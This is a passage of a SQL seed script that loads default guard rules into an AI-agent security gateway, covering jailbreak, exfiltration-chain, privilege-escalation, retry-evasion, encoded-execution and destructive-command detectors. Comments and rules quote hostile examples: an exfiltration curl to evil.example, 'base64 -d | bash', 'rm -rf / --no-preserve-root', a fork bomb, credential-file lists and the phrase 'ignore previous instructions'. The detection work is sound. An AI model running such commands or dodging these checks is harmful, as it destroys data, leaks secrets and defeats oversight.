SELECT 'default', 'prompt-copyright', 1, 'demo-default', 'cloud', 'prompt',
    'COPYRIGHT', 80, 'deny', '{"bind_scope":"global"}',
    '"Copyrighted content, pirated resources, infringing generation."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-copyright' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-copyright', 1, 'demo-default', 'cloud', 'prompt', 'COPYRIGHT', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-copyright');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-jailbreak', 1, 'demo-default', 'cloud', 'prompt',
    'JAILBREAK', 100, 'deny', '{"bind_scope":"global"}',
    '"DAN, role-play bypass, ignore previous instructions and other prompt injection / jailbreak attacks."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-jailbreak' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-jailbreak', 1, 'demo-default', 'cloud', 'prompt', 'JAILBREAK', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-jailbreak');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'prompt-agent', 1, 'demo-default', 'cloud', 'prompt',
    'AGENT', 100, 'deny', '{"bind_scope":"global"}',
    '"Agent tool misuse, MCP tool abuse, unauthorized tool calls, data exfiltration or harmful actions via tools."',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'prompt-agent' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'prompt-agent', 1, 'demo-default', 'cloud', 'prompt', 'AGENT', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'prompt-agent');

-- ============================================================
-- Demo Falco rules
-- ============================================================

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'builtin_sensitive_file_access', 1, 'system-builtin', 'falco', 'falco',
    'WARNING', 100, 'deny',
    '{"bind_scope":"global","description":"Detect access to sensitive system files"}',
    '{"condition":"evt.type in (open, openat, openat2) and fd.name in (/etc/shadow, /etc/passwd, /root/.ssh/id_rsa, /root/.ssh/authorized_keys) and evt.is_open_write=true","output":"Sensitive file access (user=%user.name, pid=%proc.pid, ppid=%proc.ppid, container=%container.id, pname=%proc.name, file=%fd.name, pcmdline=%proc.pcmdline)","priority":"WARNING","tags":["agent","filesystem","sensitive"]}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'builtin_sensitive_file_access' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'builtin_sensitive_file_access', 1, 'system-builtin', 'falco', 'falco', 'WARNING', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'builtin_sensitive_file_access');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'builtin_agent_process_spawned', 1, 'system-builtin', 'falco', 'falco',
    'WARNING', 80, 'deny',
    '{"bind_scope":"global","description":"Detect new processes spawned by Agent"}',
    '{"condition":"evt.type in (execve, execveat) and evt.dir=< and not proc.name startswith \"falco\" and not proc.name startswith \"virbius\"","output":"Agent process spawned (user=%user.name, pid=%proc.pid, ppid=%proc.ppid, container=%container.id, command=%proc.cmdline, pcmdline=%proc.pcmdline)","priority":"WARNING","tags":["agent","process"]}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'builtin_agent_process_spawned' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'builtin_agent_process_spawned', 1, 'system-builtin', 'falco', 'falco', 'WARNING', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'builtin_agent_process_spawned');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'builtin_agent_outbound_connection', 1, 'system-builtin', 'falco', 'falco',
    'NOTICE', 60, 'deny',
    '{"bind_scope":"global","description":"Detect outbound connections from Agent"}',
    '{"condition":"evt.type=connect and evt.dir=< and fd.typechar=4 and not fd.net in (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)","output":"Agent outbound connection (pid=%proc.pid, ppid=%proc.ppid, container=%container.id, pname=%proc.name, sip=%fd.sip, sport=%fd.sport, pcmdline=%proc.pcmdline)","priority":"NOTICE","tags":["agent","network"]}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'builtin_agent_outbound_connection' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'builtin_agent_outbound_connection', 1, 'system-builtin', 'falco', 'falco', 'NOTICE', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'builtin_agent_outbound_connection');

-- ============================================================
-- Demo DLP rule (edge / dlp-dsl)
-- ============================================================

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at
)
SELECT 'default', 'edge_dlp_phone', 1, 'demo-default', 'edge', 'dlp-dsl',
    'DLP_PHONE', 0, 'allow', '{}',
    '{"entity_type":"phone_cn","priority":0,"mask_template":"{{VIRBIUS_PHONE_CN_{seq}}}"}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_phone' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_dlp_phone', 1, 'demo-default', 'edge', 'dlp-dsl', 'DLP_PHONE', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_phone');

-- ============================================================
-- Demo tool registry entries (sandbox config)
-- ============================================================

INSERT INTO tb_tool_registry (tenant_id, tool_name, risk_class, sandbox_type, timeout_ms, fast_path, allowed_args_schema, description)
SELECT 'default', 'read_file', 'low', 'landlock', 5000, 1,
    '{"read_paths":["/tmp/data/*","/home/user/workdir/*","/usr/lib/*"],"write_paths":[],"exec_paths":["/usr/bin/cat","/usr/bin/head"]}',
    'Read file content with Landlock path restriction'
FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_tool_registry WHERE tenant_id = 'default' AND tool_name = 'read_file');

INSERT INTO tb_tool_registry (tenant_id, tool_name, risk_class, sandbox_type, timeout_ms, fast_path, allowed_args_schema, description)
SELECT 'default', 'exec_cmd', 'high', 'gvisor', 30000, 0,
    '{"runsc_path":"/usr/local/bin/runsc","rootfs_path":"/opt/virbius/rootfs","min_warm":2,"max_idle":5,"memory_limit_bytes":268435456,"cpu_quota":1.0,"network_disabled":true,"exec_timeout_ms":30000}',
    'Execute command in gVisor sandbox with warm pool'
FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_tool_registry WHERE tenant_id = 'default' AND tool_name = 'exec_cmd');

INSERT INTO tb_tool_registry (tenant_id, tool_name, risk_class, sandbox_type, timeout_ms, fast_path, allowed_args_schema, description)
SELECT 'default', 'curl', 'network', 'none', 15000, 0,
    '{"allowed_hosts":["api.openai.com","api.github.com"],"deny_cidrs":["10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","169.254.169.254/32"]}',
    'HTTP client with SSRF protection via domain allowlist + CIDR deny'
FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_tool_registry WHERE tenant_id = 'default' AND tool_name = 'curl');

-- ============================================================
-- Demo Groovy L3 complex scripts (cloud / groovy)
-- ============================================================

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_tool_chain_detect', 1, 'demo-default', 'cloud', 'groovy',
    'CLOUD_TOOL_CHAIN_ABUSE', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    def history = ctx.sessionHistory(5)
    def tools = history.collect { it.tool_name }
    def readIdx = tools.indexOf("read_file")
    def curlIdx = tools.indexOf("curl")
    if (readIdx >= 0 && curlIdx >= 0 && readIdx < curlIdx) {
        def target = history[curlIdx]?.args?.url
        if (target != null && !ctx.isInternalHost(target)) {
            ctx.incrementRiskScore(20)
            return true
        }
    }
    if (tools.size() >= 10 && tools.every { it == "search" }) {
        ctx.incrementRiskScore(15)
        return true
    }
    return false
}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_tool_chain_detect' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_tool_chain_detect', 1, 'demo-default', 'cloud', 'groovy', 'CLOUD_TOOL_CHAIN_ABUSE', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_tool_chain_detect');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_sensitive_resource_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'SENSITIVE_RESOURCE_ACCESS', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_sensitive_resource_deny — 凭证 / 敏感资源访问拦截
    // 命中: cat ~/.ssh/id_rsa | 读取 .aws/credentials | 请求 169.254.169.254
    // 不命中(防误报): README.md | /home/u/workdir/app.py | 普通日志文件
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面（资源路径语义不套用到 chat 内容）
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // SSH 私钥
    def sshKeys = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]
    // 云厂商 / 包管理器凭据与令牌文件
    def credFiles = [".aws/credentials", ".aws/config", ".config/gcloud", ".kube/config",
        ".docker/config.json", ".git-credentials", ".netrc", ".npmrc", ".pypirc",
        ".azure/", ".gnupg/", "wallet.dat", "service_account.json", "service-account.json",
        "credentials.json"]
    // 系统敏感文件（影子口令 / 提权配置 / 进程环境）
    def systemFiles = ["/etc/shadow", "/etc/sudoers", "/proc/self/environ"]
    // 云元数据端点与容器运行时 socket
    def metadata = ["169.254.169.254", "169.254.170.2", "metadata.google.internal",
        "metadata.azure.com", "/var/run/docker.sock", "/run/containerd/containerd.sock"]
    def markers = sshKeys + credFiles + systemFiles + metadata
    if (markers.any { text.contains(it) }) {
        ctx.setIntent("deny")
        return true
    }
    return false
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_sensitive_resource_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_sensitive_resource_deny', 1, 'system-builtin', 'cloud', 'groovy', 'SENSITIVE_RESOURCE_ACCESS', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_sensitive_resource_deny');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'chain-exfil', 1, 'system-builtin', 'cloud', 'groovy',
    'CHAIN_ABUSE', 20, 'challenge', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // chain-exfil — 读敏感路径 → 外发非内部主机
    // 命中: read_file /etc/shadow 后 curl http://evil.example/collect
    // 不命中(防误报): 读 workdir 文件 → 调用内网 API（isInternalHost 放行）
    // 维护: virbius default rules 2026-10-22
    // 回溯最近 5 步会话历史 + 本次调用，识别 读→外发 两步链
    def readTools = ["read_file", "cat", "read", "get_file", "download", "list_dir"]
    def netTools = ["curl", "http_get", "http_post", "fetch", "webhook_call", "wget", "request"]
    def sensitive = ["/etc/", "/root/", "/.ssh", "id_rsa", ".env", "credentials", "secret", "/var/"]
    def seq = []
    def h = ctx.sessionHistory(5)
    for (int i = h.size() - 1; i >= 0; i--) {
        seq.add(h[i])
    }
    seq.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (seq.size() > 5) {
        seq = seq.subList(seq.size() - 5, seq.size())
    }
    def step = 0
    for (def e : seq) {
        def t = e.tool_name?.toString()
        def a = (e.args ?: "").toString().toLowerCase()
        // 第 1 步：读取敏感路径
        if (step == 0 && t != null && readTools.contains(t) && sensitive.any { a.contains(it) }) {
            step = 1
        // 第 2 步：外发到非内部主机
        } else if (step == 1 && t != null && netTools.contains(t)) {
            def i = a.indexOf("http")
            if (i >= 0) {
                def rest = a.substring(i)
                def end = rest.indexOf(34)
                def url = end > 0 ? rest.substring(0, end) : rest
                if (!ctx.isInternalHost(url)) {
                    step = 2
                }
            }
        }
    }
    return step == 2
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'chain-exfil' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'chain-exfil', 1, 'system-builtin', 'cloud', 'groovy', 'CHAIN_ABUSE', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'chain-exfil');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'chain-write-exec', 1, 'system-builtin', 'cloud', 'groovy',
    'CHAIN_ABUSE', 25, 'challenge', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // chain-write-exec — 写文件 → 执行
    // 命中: write_file /tmp/x.sh 后 exec_cmd "bash /tmp/x.sh"
    // 不命中(防误报): 只写不执行 | 只执行不写
    // 维护: virbius default rules 2026-10-22
    // 回溯最近 6 步会话历史 + 本次调用，识别 写→执行 两步链
    def writeTools = ["write_file", "delete_file", "rm", "mv", "cp", "truncate", "edit_file", "db_write"]
    def execTools = ["exec_cmd", "shell", "bash", "sh", "execute_python", "run_command", "subprocess"]
    def seq = []
    def h = ctx.sessionHistory(6)
    for (int i = h.size() - 1; i >= 0; i--) {
        seq.add(h[i])
    }
    seq.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (seq.size() > 6) {
        seq = seq.subList(seq.size() - 6, seq.size())
    }
    def step = 0
    for (def e : seq) {
        def t = e.tool_name?.toString()
        // 第 1 步：写入 / 改写
        if (step == 0 && t != null && writeTools.contains(t)) {
            step = 1
        // 第 2 步：执行
        } else if (step == 1 && t != null && execTools.contains(t)) {
            step = 2
        }
    }
    return step == 2
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'chain-write-exec' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'chain-write-exec', 1, 'system-builtin', 'cloud', 'groovy', 'CHAIN_ABUSE', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'chain-write-exec');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'chain-priv-esc', 1, 'system-builtin', 'cloud', 'groovy',
    'CHAIN_ABUSE', 15, 'challenge', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // chain-priv-esc — 读 → 写 → 执行 三步提权链
    // 命中: read_file /etc/passwd → write_file /etc/sudoers.d/x → exec_cmd
    // 不命中(防误报): 纯读 | 纯写 | 读→执行（不经过写）
    // 维护: virbius default rules 2026-10-22
    // 回溯最近 8 步会话历史 + 本次调用
    def readTools = ["read_file", "cat", "read", "get_file", "download", "list_dir"]
    def writeTools = ["write_file", "delete_file", "rm", "mv", "cp", "truncate", "edit_file", "db_write"]
    def execTools = ["exec_cmd", "shell", "bash", "sh", "execute_python", "run_command", "subprocess"]
    def seq = []
    def h = ctx.sessionHistory(8)
    for (int i = h.size() - 1; i >= 0; i--) {
        seq.add(h[i])
    }
    seq.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (seq.size() > 8) {
        seq = seq.subList(seq.size() - 8, seq.size())
    }
    def step = 0
    for (def e : seq) {
        def t = e.tool_name?.toString()
        if (step == 0 && t != null && readTools.contains(t)) {
            step = 1
        } else if (step == 1 && t != null && writeTools.contains(t)) {
            step = 2
        } else if (step == 2 && t != null && execTools.contains(t)) {
            step = 3
        }
    }
    return step == 3
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'chain-priv-esc' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'chain-priv-esc', 1, 'system-builtin', 'cloud', 'groovy', 'CHAIN_ABUSE', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'chain-priv-esc');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'retry-escape', 1, 'system-builtin', 'cloud', 'groovy',
    'RETRY_ESCAPE', 30, 'challenge', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // retry-escape — 被拦后换 tool / 换参数重试（规避检测）
    // 命中: exec_cmd 被拦后 3 步内改用 shell 或改写参数重试
    // 不命中(防误报): 连续 3 次正常放行（wash-out 洗白）| 拦后不足 3 步
    // 维护: virbius default rules 2026-10-22
    // 近 10 步会话历史内的最后拦截点 → 之后的变化尝试
    def h = ctx.sessionHistory(10)
    def attempts = []
    for (int i = h.size() - 1; i >= 0; i--) {
        attempts.add(h[i])
    }
    if (attempts.size() > 10) {
        attempts = attempts.subList(attempts.size() - 10, attempts.size())
    }
    def lastBlock = -1
    for (int i = 0; i < attempts.size(); i++) {
        if (attempts[i].allowed == false) {
            lastBlock = i
        }
    }
    if (lastBlock < 0) {
        return false
    }
    def blocked = attempts[lastBlock]
    // wash-out：拦后已连续 3 次正常放行则不再视为重试
    def trailing = 0
    for (int i = attempts.size() - 1; i > lastBlock; i--) {
        if (attempts[i].allowed != false) {
            trailing++
        } else {
            break
        }
    }
    if (trailing >= 3) {
        return false
    }
    def after = []
    after.addAll(attempts.subList(lastBlock + 1, attempts.size()))
    after.add([tool_name: ctx.var("tool_name"), args: ctx.var("content")])
    if (after.size() < 3) {
        return false
    }
    def bTool = blocked.tool_name?.toString()
    def bArgs = (blocked.args ?: "").toString()
    // 换 tool 或换参数均算变化尝试
    return after.any {
        def t = it.tool_name?.toString()
        def a = (it.args ?: "").toString()
        (t != null && t != bTool) || a != bArgs
    }
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'retry-escape' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'retry-escape', 1, 'system-builtin', 'cloud', 'groovy', 'RETRY_ESCAPE', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'retry-escape');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_encoded_exec_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'ENCODED_EXEC', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_encoded_exec_deny — 编码载荷解码 + 执行引信
    // 命中: echo <b64> | base64 -d | bash | python -c exec(base64.b64decode(...))
    // 不命中(防误报): base64 -d 到文件 | tar/gzip 解压归档 | openssl 解密落盘
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 解码器
    def b64 = text.contains("base64 -d") || text.contains("base64 --decode")
    def gz = text.contains("gzip -d") || text.contains("gunzip")
    def ossl = text.contains("openssl") && text.contains("enc") && text.contains("-d")
    // 执行引信（shell 管道 / 解释器 / 脚本宿主）
    def shell = text.contains("| bash") || text.contains("| sh") || text.contains("bash -c")
    def py = text.contains("exec(base64.b64decode") || (text.contains("b64decode") && (text.contains("exec(") || text.contains("eval(")))
    def ps = text.contains("powershell") && text.contains("-enc")
    def cert = text.contains("certutil") && text.contains("-decode")
    def xxd = text.contains("xxd -r") && (text.contains("| sh") || text.contains("| bash"))
    def js = text.contains("frombase64string") || (text.contains("atob(") && text.contains("eval("))
    def pl = text.contains("mime::base64") && (text.contains("system(") || text.contains("eval("))
    return ((b64 || gz) && shell) || py || (ossl && shell) || pl || ps || cert || xxd || js
}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_encoded_exec_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_encoded_exec_deny', 1, 'system-builtin', 'cloud', 'groovy', 'ENCODED_EXEC', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_encoded_exec_deny');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_destructive_command_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'DESTRUCTIVE_COMMAND', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_destructive_command_deny — 不可逆破坏性命令拦截
    // 命中: rm -rf / --no-preserve-root | mkfs.ext4 /dev/sda | dd of=/dev/nvme0n1
    // 不命中(防误报): rm -rf /tmp | dd of=/tmp/img | find workdir -delete
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 删根（白名单常见临时目录，避免误伤构建清理）
    def rmRoot = text.contains("rm -rf /") && !text.contains("rm -rf /tmp") && !text.contains("rm -rf /home") && !text.contains("rm -rf /var/tmp") && !text.contains("rm -rf /users")
    // 裸盘设备族 + 写入方向（dd of= / 重定向）
    def diskFam = text.contains("/dev/sd") || text.contains("/dev/nvme") || text.contains("/dev/vd") || text.contains("/dev/hd") || text.contains("/dev/mapper") || text.contains("/dev/disk")
    def diskWrite = text.contains("shred") && text.contains("/dev/")
    diskWrite = diskWrite || ((text.contains("of=") || text.contains("> /dev/") || text.contains(">> /dev/")) && diskFam)
    // 未命名破坏面：格式化 / 零写盘 / 根域删除扫描 / 关机 / fork 炸弹 / 权限放开
    def named = text.contains("--no-preserve-root")
        || text.contains("mkfs")
        || text.contains("dd if=/dev/zero of=/dev/")
        || (text.contains("-delete") && text.contains("find / "))
        || text.contains("shutdown -h")
        || text.contains("shutdown now")
        || text.contains(":(){ :|:& };:")
        || text.contains("chmod -r 777 /")
    return rmRoot || diskWrite || named
}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_destructive_command_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_destructive_command_deny', 1, 'system-builtin', 'cloud', 'groovy', 'DESTRUCTIVE_COMMAND', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_destructive_command_deny');

INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_session_risk_escalation', 1, 'demo-default', 'cloud', 'groovy',
    'CLOUD_SESSION_RISK_ESCALATION', 85, 'challenge', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_session_risk_escalation — 会话风险分阶梯动作（管理面兜底）
